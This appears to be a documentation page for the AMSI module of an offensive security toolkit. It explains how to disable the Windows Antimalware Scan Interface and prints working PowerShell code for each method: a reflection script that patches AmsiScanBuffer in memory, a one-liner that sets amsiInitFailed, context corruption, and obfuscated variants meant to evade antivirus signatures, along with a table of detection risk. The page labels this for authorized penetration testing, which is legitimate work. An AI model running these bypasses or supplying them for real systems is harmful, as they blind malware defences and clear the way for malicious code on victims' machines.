# AMSI Bypass

> Bypass Windows Antimalware Scan Interface.

## Overview

The `amsi` resource provides techniques to bypass AMSI on Windows:
- Memory patching
- PowerShell reflection
- Context corruption
- COM hijacking

## Commands

| Command | Description |
|---------|-------------|
| `powershell` | Generate PowerShell bypass script |
| `csharp` | Generate C# bypass code |
| `providers` | List AMSI provider CLSIDs |

## Usage

### PowerShell Bypass

```bash
rb evasion amsi powershell patch
```

Output:
```
▸ AMSI Bypass - PowerShell

ℹ Method: PatchAmsiScanBuffer

# AMSI Bypass - Patch AmsiScanBuffer via Reflection
# WARNING: For authorized testing only

$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

### C# Bypass

```bash
rb evasion amsi csharp
```

### AMSI Providers

```bash
rb evasion amsi providers
```

Output:
```
▸ AMSI Providers

  Windows Defender:           {2781761E-28E0-4109-99FE-B9D127C57AFE}
  Microsoft Security:         {A7C452EF-8E9F-42EB-9F2B-245613CA0DC9}

ℹ Third-party AV products register additional CLSIDs
```

## Bypass Techniques

### 1. Patch AmsiScanBuffer

Patches the function to return `E_INVALIDARG`:

```asm
mov eax, 0x80070057  ; E_INVALIDARG
ret
```

### 2. Force amsiInitFailed

Sets internal flag to indicate AMSI failed to initialize:

```powershell
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").
    GetField("amsiInitFailed","NonPublic,Static").
    SetValue($null,$true)
```

### 3. Context Corruption

Corrupts AMSI context to cause failures:

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").
    GetField("amsiContext","NonPublic,Static").
    SetValue($null, [IntPtr]$mem)
```

## Obfuscated Versions

For signature evasion:

```bash
rb evasion amsi powershell obfuscated
```

Output uses string concatenation and base64 to avoid detection:

```powershell
$a = 'Si'; $b = 'Am'; $c = 'ls'; $d = 'ti'; $e = 'U';
$f = $b+$c+$d+$e+$a; # "AmsiUtils"
# ...
```

## Detection by AV

| Technique | Detection Risk |
|-----------|---------------|
| Plain patch | HIGH - Signatures exist |
| Obfuscated | MEDIUM - Some detect |
| Context corruption | LOW - Less common |
| COM hijacking | LOW - Requires setup |

## Warning

AMSI bypass is for **authorized Windows penetration testing only**. On non-Windows systems, these commands return documentation only.

## Related

- [inject](09-inject.md) - Process injection
- [strings](08-strings.md) - String encryption
- [apihash](06-apihash.md) - API hashing
